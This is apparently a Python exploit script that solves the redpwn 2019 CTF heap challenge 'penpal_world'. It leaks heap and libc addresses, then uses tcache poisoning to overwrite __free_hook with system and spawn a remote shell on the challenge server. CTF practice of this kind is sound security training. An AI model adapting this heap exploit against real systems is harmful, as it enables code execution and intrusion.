from ptrlib import *

cnt = 0

def create(index):
    global cnt
    cnt += 1
    sock.sendlineafter("Read a postcard\n", "1")
    sock.sendlineafter("#?\n", str(index))
    return

def edit(index, data):
    global cnt
    cnt += 1
    sock.sendlineafter("Read a postcard\n", "2")
    sock.sendlineafter("#?\n", str(index))
    sock.sendafter("Write.\n", data)
    return

def read(index):
    global cnt
    cnt += 1
    sock.sendlineafter("Read a postcard\n", "4")
    sock.sendlineafter("#?\n", str(index))
    return sock.recvline()

def discard(index):
    global cnt
    cnt += 1
    sock.sendlineafter("Read a postcard\n", "3")
    sock.sendlineafter("#?\n", str(index))
    return

#sock = Process("./penpal_world")
sock = Socket("chall2.2019.redpwn.net", 4010)
libc = ELF("./libc-2.27.so")
libc_main_arena = 0x3ebc40
delta = 0x60

# leak heap address
create(0)
create(1)
payload = b"A" * 0x38
payload += p64(0x50)
edit(0, payload)
edit(1, payload)
discard(0)
discard(0)
addr_heap = u64(read(0))
logger.info("heap = " + hex(addr_heap))

# fake chunk
edit(0, p64(addr_heap + 0x40 + 0x500))
create(0)
create(0)
edit(0, p64(0) + p64(0x51))
create(0)
discard(0)
discard(0)

# fake chunk 2
edit(0, p64(addr_heap + 0x40 + 0x500 + 0x50))
create(0)
create(0)
edit(0, p64(0) + p64(0x51))
create(0)
discard(0)
discard(0)

# chunk overlap
edit(0, p64(addr_heap + 0x40))
create(0)
create(0)
edit(0, p64(0) + p64(0x501))
discard(1)
libc_base = u64(read(1)) - libc_main_arena - delta
logger.info("libc = " + hex(libc_base))

#create(0) # mottainai
discard(0)
discard(0)

# tcache poisoning
edit(0, p64(libc_base + libc.symbol("__free_hook") - 8))
create(0)
create(0)
edit(0, b"/bin/sh\x00" + p64(libc_base + libc.symbol("system")))
discard(0)

sock.interactive()
